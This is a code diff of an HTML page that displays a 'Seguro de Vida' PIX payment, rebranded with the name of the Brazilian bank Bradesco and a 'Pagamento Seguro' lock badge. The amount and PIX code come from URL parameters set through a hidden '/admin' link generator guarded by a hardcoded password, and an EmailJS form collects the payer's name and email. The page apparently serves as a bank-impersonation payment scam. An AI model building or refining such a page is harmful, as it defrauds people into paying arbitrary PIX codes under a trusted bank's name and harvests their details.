@@ -2,8 +2,12 @@
 <html lang="pt-br">
 <head>
 <meta charset="UTF-8">
-<title>Seguro de Vida - Pagamento</title>
+<title>Pagamento Seguro</title>
+
 <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
 <style>
 body {
@@ -12,94 +16,67 @@ body {
     margin: 0;
 }
 
-/* HEADER */
 .header {
-    background: #cc092f;
-    padding: 15px;
+    background: linear-gradient(90deg, #cc092f, #a30726);
+    padding: 18px;
     text-align: center;
 }
 
-.logo {
-    width: 130px;
+.logo-text {
+    color: white;
+    font-size: 26px;
+    font-weight: bold;
 }
 
-/* CARD */
 .container {
     max-width: 400px;
-    margin: 40px auto;
+    margin: 30px auto;
     background: white;
     padding: 25px;
-    border-radius: 15px;
+    border-radius: 18px;
     text-align: center;
-    box-shadow: 0px 5px 15px rgba(0,0,0,0.1);
 }
 
 .valor {
-    font-size: 32px;
-    color: #cc092f;
-    font-weight: bold;
-    margin: 10px 0;
-}
-
-.descricao {
-    color: #555;
-    margin-bottom: 15px;
-}
-
-.status {
-    margin-top: 10px;
-    font-weight: bold;
-}
-
-.timer {
+    font-size: 30px;
     color: #cc092f;
     font-weight: bold;
 }
 
-/* BOTÕES */
 button {
     width: 100%;
     padding: 12px;
     margin-top: 10px;
-    border: none;
     border-radius: 10px;
+    border: none;
     background: #cc092f;
     color: white;
-    font-weight: bold;
-    cursor: pointer;
 }
 
-button:hover {
-    background: #a30726;
-}
-
-/* INPUTS */
-textarea, input {
+input, textarea {
     width: 100%;
-    margin-top: 10px;
+    margin-top: 8px;
     padding: 10px;
-    border-radius: 10px;
-    border: 1px solid #ccc;
 }
 
-.hidden { display: none; }
+.hidden { display:none; }
 </style>
 </head>
 
 <body>
 
-<!-- TOPO -->
 <div class="header">
-    <img src="logo.png" class="logo">
+    <div class="logo-text">Bradesco</div>
 </div>
 
 <!-- CLIENTE -->
 <div class="container" id="cliente">
 
+    <div>🔒 Pagamento Seguro</div>
+
     <h3>Seguro de Vida</h3>
 
     <div class="valor" id="valor">R$ 0,00</div>
-    <div class="descricao" id="descricao">Proteção financeira para você e sua família</div>
 
     <div id="qr"></div>
 
@@ -107,145 +84,101 @@ textarea, input {
 
     <textarea id="codigoPix" readonly></textarea>
 
-    <button onclick="abrirBanco()">Abrir no app do banco</button>
+    <h4>Já realizou o pagamento?</h4>
 
-    <div class="status" id="status">Aguardando pagamento</div>
-    <div class="timer" id="timer"></div>
-</div>
+    <input id="nome" placeholder="Seu nome">
+    <input id="email" placeholder="Seu email">
 
-<!-- LOGIN -->
-<div class="container hidden" id="login">
-    <h2>Admin</h2>
-    <input type="password" id="senha" placeholder="Senha">
-    <button onclick="login()">Entrar</button>
+    <button onclick="enviar()">Confirmar pagamento</button>
+
+    <div id="msg"></div>
+
 </div>
 
 <!-- ADMIN -->
 <div class="container hidden" id="admin">
-    <h2>Nova Cobrança</h2>
+    <h3>Admin</h3>
 
-    <input type="number" id="valorInput" placeholder="Valor">
-    <input type="text" id="descInput" placeholder="Descrição">
-    <input type="text" id="codigoInput" placeholder="Código PIX">
+    <input id="valorInput" placeholder="Valor">
+    <input id="pixInput" placeholder="Código PIX">
 
-    <button onclick="gerar()">Gerar Link</button>
+    <button onclick="gerar()">Gerar link</button>
 
-    <p id="linkGerado"></p>
+    <p id="link"></p>
 </div>
 
 <script>
 const SENHA = "153319";
 
-// detectar /admin
-if (window.location.pathname === "/admin") {
-    document.getElementById("cliente").classList.add("hidden");
-    document.getElementById("login").classList.remove("hidden");
-}
+/* EMAILJS INIT */
+(function(){
+    emailjs.init("SUA_PUBLIC_KEY"); // 🔴 TROCAR
+})();
 
-// login
-function login() {
-    let senha = document.getElementById("senha").value;
-
-    if (senha === SENHA) {
-        document.getElementById("login").classList.add("hidden");
-        document.getElementById("admin").classList.remove("hidden");
+/* ADMIN */
+if(location.pathname=="/admin"){
+    let s = prompt("Senha:");
+    if(s===SENHA){
+        admin.classList.remove("hidden");
+        cliente.style.display="none";
     } else {
-        alert("Senha incorreta");
+        alert("Sem acesso");
     }
 }
 
-// formatar valor
-function formatar(valor) {
-    return Number(valor).toLocaleString("pt-BR", {
-        style: "currency",
-        currency: "BRL"
-    });
+/* GERAR LINK */
+function gerar(){
+    let valor = valorInput.value;
+    let pix = pixInput.value;
+
+    let linkFinal = location.origin + "/?valor="+valor+"&pix="+encodeURIComponent(pix);
+
+    link.innerText = linkFinal;
 }
 
-// gerar link
-function gerar() {
-    let valor = document.getElementById("valorInput").value;
-    let desc = document.getElementById("descInput").value;
-    let codigo = document.getElementById("codigoInput").value;
+/* CARREGAR */
+function carregar(){
+    let p = new URLSearchParams(location.search);
 
-    if (!valor || !codigo) {
-        alert("Preencha valor e código!");
+    let valor = p.get("valor");
+    let pix = p.get("pix");
+
+    if(!valor || !pix) return;
+
+    document.getElementById("valor").innerText = "R$ "+valor;
+    codigoPix.value = pix;
+
+    window.pix = pix;
+
+    new QRCode(qr, {text:pix,width:200,height:200});
+}
+
+/* COPIAR */
+function copiar(){
+    navigator.clipboard.writeText(window.pix);
+    alert("Copiado!");
+}
+
+/* ENVIAR EMAIL */
+function enviar(){
+
+    let nome = document.getElementById("nome").value;
+    let email = document.getElementById("email").value;
+
+    if(!nome || !email){
+        alert("Preencha os dados");
         return;
     }
 
-    let link = window.location.origin +
-        `/?valor=${encodeURIComponent(valor)}&desc=${encodeURIComponent(desc)}&pix=${encodeURIComponent(codigo)}`;
-
-    document.getElementById("linkGerado").innerText = link;
-}
-
-// copiar
-function copiar() {
-    navigator.clipboard.writeText(window.codigoPix);
-    alert("Código PIX copiado!");
-}
-
-// abrir banco
-function abrirBanco() {
-    if (!window.codigoPix) return;
-
-    window.location.href = "pix://" + window.codigoPix;
-
-    setTimeout(() => {
-        alert("Se não abrir automaticamente, copie o código PIX.");
-    }, 1500);
-}
-
-// carregar dados
-function carregar() {
-    let params = new URLSearchParams(window.location.search);
-
-    let valor = params.get("valor");
-    let desc = params.get("desc");
-    let codigo = params.get("pix");
-
-    if (!valor || !codigo) {
-        document.getElementById("descricao").innerText = "Cobrança não encontrada";
-        return;
-    }
-
-    document.getElementById("valor").innerText = formatar(valor);
-    document.getElementById("descricao").innerText = desc;
-
-    window.codigoPix = codigo;
-    document.getElementById("codigoPix").value = codigo;
-
-    new QRCode(document.getElementById("qr"), {
-        text: codigo,
-        width: 200,
-        height: 200
+    emailjs.send("SEU_SERVICE_ID","SEU_TEMPLATE_ID",{
+        nome: nome,
+        email: email,
+        valor: document.getElementById("valor").innerText
+    }).then(()=>{
+        msg.innerText = "Pagamento enviado para análise!";
+    },()=>{
+        msg.innerText = "Erro ao enviar!";
     });
-
-    iniciarTimer();
-}
-
-// timer
-function iniciarTimer() {
-    let tempoTotal = 15 * 60;
-    let inicio = Date.now();
-
-    let intervalo = setInterval(() => {
-        let diff = Math.floor((Date.now() - inicio) / 1000);
-        let restante = tempoTotal - diff;
-
-        if (restante <= 0) {
-            clearInterval(intervalo);
-            document.getElementById("status").innerText = "Expirado";
-            document.getElementById("timer").innerText = "";
-            return;
-        }
-
-        let min = Math.floor(restante / 60);
-        let seg = restante % 60;
-
-        document.getElementById("timer").innerText =
-            `Expira em ${min}:${seg.toString().padStart(2,'0')}`;
-    }, 1000);
 }
 
 carregar();
